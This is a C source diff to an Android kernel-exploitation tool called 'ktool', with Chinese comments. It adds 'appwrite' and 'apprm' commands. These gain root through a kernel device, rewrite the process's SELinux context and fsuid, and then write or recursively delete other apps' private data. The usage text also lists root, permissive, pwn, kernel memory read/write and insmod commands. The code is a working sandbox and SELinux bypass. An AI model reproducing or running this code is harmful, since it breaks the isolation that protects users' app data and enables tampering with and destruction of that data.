@@ -1715,6 +1715,269 @@ static int do_ctx(const char *ctx)
 	return 0;
 }
 
+/* ======================================================================
+ * appwrite / apprm —— 用「目标 app 的 fsuid + untrusted_app 域」写 / 删
+ *
+ * 为什么需要：写别人的 app 私有数据要两把钥匙，没有任何单一域同时有。
+ *
+ *   init_shell    DAC 有（uid0 + caps）
+ *                 SELinux 没有 —— 策略只给 app_data_file:dir {search,setattr}，
+ *                 连 file 规则都没有，opendir 别人的 databases 都拒（实测）
+ *   untrusted_app SELinux 有全套（file write/create、dir add_name/remove_name）
+ *                 但 capability 为空，没有 dac_override
+ *
+ * 拼法是：/dev/ktool 的 ctx 命令换 security->sid，并在内核里直接写
+ * cred->fsuid/fsgid。不用用户态 setfsuid —— sys_setfsuid() 先走
+ * capable(CAP_SETUID)，被 SELinux 拒时**静默返回旧值、不设 errno**，
+ * 用户态完全看不出来（P4.27 实测）。内核侧写 cred 字段不过检查。
+ *
+ * 铁律：ctx 之后不许再碰 stdio。向 shell 的 pty/pipe 写是一次
+ * security_file_permission，untrusted_app 拿不到写权限，本内核的审计路径
+ * （avc_audit_pre_callback 里 strnlen 野指针）会 oops，实测打挂进程。
+ * 所以两个命令都在切域前 fflush、切域后一律 _exit，结果只用退出码表达。
+ * ==================================================================== */
+
+/* dirname() 的替身，省一个 libgen.h */
+static void kt_parent_dir(char *path)
+{
+	char *slash = strrchr(path, '/');
+
+	if (!slash || slash == path) {
+		path[0] = '/';
+		path[1] = 0;
+		return;
+	}
+	*slash = 0;
+}
+
+/* 切到「目标路径的父目录 owner + untrusted_app」。返回 0 表示已经切了，
+ * 此后调用方不能再 printf。 */
+static int kt_enter_app(const char *path)
+{
+	char msg[128], *tmp;
+	struct stat st;
+
+	tmp = strdup(path);
+	if (!tmp)
+		return -1;
+	kt_parent_dir(tmp);
+	if (stat(tmp, &st) != 0) {
+		fprintf(stderr, "ktool: stat %s: %s\n", tmp, strerror(errno));
+		free(tmp);
+		return -1;
+	}
+	free(tmp);
+
+	snprintf(msg, sizeof(msg), "ctx u:r:untrusted_app:s0 %u %u",
+		 (unsigned)st.st_uid, (unsigned)st.st_gid);
+	fflush(stdout);
+	fflush(stderr);
+	if (do_ctx(msg) != 0)
+		return -1;
+	return 0;
+}
+
+static int kt_rm_one(const char *path, int recursive, int force);
+
+static int kt_rm_dir(const char *path, int recursive, int force)
+{
+	DIR *d;
+	struct dirent *e;
+	int rc = 0;
+
+	d = opendir(path);
+	if (!d)
+		return (force && errno == ENOENT) ? 0 : -1;
+	if (!recursive) {
+		closedir(d);
+		return -2;
+	}
+	while ((e = readdir(d)) != NULL) {
+		char child[4096];
+
+		if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, ".."))
+			continue;
+		if (snprintf(child, sizeof(child), "%s/%s", path, e->d_name) >=
+		    (int)sizeof(child)) {
+			rc = -1;
+			continue;
+		}
+		if (kt_rm_one(child, recursive, force) != 0)
+			rc = -1;
+	}
+	closedir(d);
+	if (rc == 0 && rmdir(path) != 0 && !(force && errno == ENOENT))
+		rc = -1;
+	return rc;
+}
+
+static int kt_rm_one(const char *path, int recursive, int force)
+{
+	struct stat st;
+
+	if (lstat(path, &st) != 0)
+		return (force && errno == ENOENT) ? 0 : -1;
+	if (S_ISDIR(st.st_mode))
+		return kt_rm_dir(path, recursive, force);
+	if (unlink(path) != 0)
+		return (force && errno == ENOENT) ? 0 : -1;
+	return 0;
+}
+
+/*
+ * appwrite <src|-> <dst>
+ *   源文件先以 init_shell 身份读进来（任意路径都能读），再切到目标目录
+ *   owner 的身份写出去。stdin 用 "-"。
+ */
+static int kt_cmd_appwrite(int argc, char **argv)
+{
+	unsigned char *buf;
+	size_t cap = 1 << 20, len = 0, off;
+	const char *src, *dst;
+	ssize_t n;
+	int fd;
+
+	if (argc != 4) {
+		fprintf(stderr, "usage: appwrite <src|-> <dst>\n");
+		return 1;
+	}
+	src = argv[2];
+	dst = argv[3];
+
+	/* /dev/ktool 的门禁只认 su 和 uid0 进程，所以先自己提权。
+	 * do_root 是原地改 cred，不 exec，提权后还能接着做业务。 */
+	if (getuid() != 0) {
+		fflush(stdout);
+		if (do_root() != 0) {
+			fprintf(stderr, "ktool: 提权失败（模块没加载？）\n");
+			return 3;
+		}
+	}
+
+	fd = strcmp(src, "-") ? open(src, O_RDONLY) : 0;
+	if (fd < 0) {
+		fprintf(stderr, "ktool: open %s: %s\n", src, strerror(errno));
+		return 1;
+	}
+	buf = malloc(cap);
+	if (!buf) {
+		fprintf(stderr, "ktool: out of memory\n");
+		return 1;
+	}
+	for (;;) {
+		if (len == cap) {
+			unsigned char *nb = realloc(buf, cap * 2);
+
+			if (!nb) {
+				fprintf(stderr, "ktool: out of memory\n");
+				return 1;
+			}
+			buf = nb;
+			cap *= 2;
+		}
+		n = read(fd, buf + len, cap - len);
+		if (n < 0) {
+			if (errno == EINTR)
+				continue;
+			fprintf(stderr, "ktool: read %s: %s\n", src,
+				strerror(errno));
+			return 1;
+		}
+		if (n == 0)
+			break;
+		len += n;
+	}
+	if (fd)
+		close(fd);
+
+	printf("appwrite: %zu bytes -> %s\n", len, dst);
+
+	if (kt_enter_app(dst) != 0)
+		return 3;
+
+	/* 已切域：之后只能 _exit */
+	fd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0600);
+	if (fd < 0)
+		_exit(4);
+	for (off = 0; off < len;) {
+		n = write(fd, buf + off, len - off);
+		if (n < 0) {
+			if (errno == EINTR)
+				continue;
+			close(fd);
+			_exit(5);
+		}
+		off += (size_t)n;
+	}
+	if (close(fd) != 0)
+		_exit(6);
+	_exit(0);
+}
+
+/*
+ * apprm [-r] [-f] <path>...
+ *   同一目录下的多个路径共用一次 ctx；owner 变了就再切一次。
+ */
+static int kt_cmd_apprm(int argc, char **argv)
+{
+	uid_t cur_uid = (uid_t)-1;
+	gid_t cur_gid = (gid_t)-1;
+	int recursive = 0, force = 0, rc = 0, i;
+
+	for (i = 2; i < argc && argv[i][0] == '-' && argv[i][1]; i++) {
+		if (!strcmp(argv[i], "-r"))
+			recursive = 1;
+		else if (!strcmp(argv[i], "-f"))
+			force = 1;
+		else {
+			fprintf(stderr, "usage: apprm [-r] [-f] <path>...\n");
+			return 1;
+		}
+	}
+	if (i >= argc) {
+		fprintf(stderr, "usage: apprm [-r] [-f] <path>...\n");
+		return 1;
+	}
+
+	if (getuid() != 0) {
+		fflush(stdout);
+		if (do_root() != 0) {
+			fprintf(stderr, "ktool: 提权失败（模块没加载？）\n");
+			return 3;
+		}
+	}
+
+	for (; i < argc; i++) {
+		struct stat st;
+		char *tmp;
+
+		tmp = strdup(argv[i]);
+		if (!tmp)
+			return 1;
+		kt_parent_dir(tmp);
+		if (stat(tmp, &st) != 0) {
+			fprintf(stderr, "ktool: stat %s: %s\n", tmp,
+				strerror(errno));
+			free(tmp);
+			rc = 1;
+			continue;
+		}
+		free(tmp);
+
+		if (st.st_uid != cur_uid || st.st_gid != cur_gid) {
+			if (kt_enter_app(argv[i]) != 0)
+				return 3;
+			cur_uid = st.st_uid;
+			cur_gid = st.st_gid;
+		}
+		if (kt_rm_one(argv[i], recursive, force) != 0)
+			rc = 1;
+	}
+	fflush(stdout);
+	fflush(stderr);
+	_exit(rc);
+}
+
 static int do_patch_exec(int on)
 {
 	unsigned char b[8];
@@ -2013,6 +2276,7 @@ int main(int argc, char **argv)
 		fprintf(stderr,
 			"usage: %s [-t sec] target | dump <hexaddr> <len> | root | sh | permissive |\n"
 			"          patch | unpatch | enforce [--noflush] | flush | pwn [cmd]\n"
+			"          appwrite <src|-> <dst> | apprm [-r] [-f] <path>...\n"
 			"          kread_file <addr> <len> <out> [-r] | kwrite_file <in> <addr> [-n]\n"
 			"          undo                              用 undo 日志还原上次写入\n"
 			"          scan <start> <len> <pat|s:text> [max]\n"
@@ -2049,6 +2313,7 @@ int main(int argc, char **argv)
 		fprintf(stderr, "refuse: 没有匹配的 target，见上面的 supported targets\n");
 		return 2;
 	}
+
 
 	for (i = 0; i < 2; i++)
 		pthread_create(&th[i], NULL, spinner, NULL);
@@ -2135,6 +2400,10 @@ static int ktool_dispatch(int argc, char **argv)
 		return 0;
 	}
 
+	if (!strcmp(argv[1], "appwrite"))
+		return kt_cmd_appwrite(argc, argv);
+	if (!strcmp(argv[1], "apprm"))
+		return kt_cmd_apprm(argc, argv);
 	if (!strcmp(argv[1], "dump") || !strcmp(argv[1], "read")) {
 		if (argc < 4) { fprintf(stderr, "need addr len\n"); return 1; }
 		addr = strtoul(argv[2], NULL, 16);
@@ -3603,6 +3872,8 @@ static void kt_repl_help(void)
 	"  pwn <cmd>                       提权 + 全开 permissive 后 exec\n"
 	"  sh                              打 patch + 切 init_shell 后给 shell\n"
 	"  boot <ko>                       bootmode=2 + permissive + insmod\n"
+	"  appwrite <src|-> <dst>          借目标目录 owner 的身份+域写文件\n"
+	"  apprm [-r] [-f] <path>...       同上，删除；切域后不再输出任何东西\n"
 	"  repl                            交互会话（别名 shell / -i）\n"
 	"  quit | exit                     退出\n");
 }
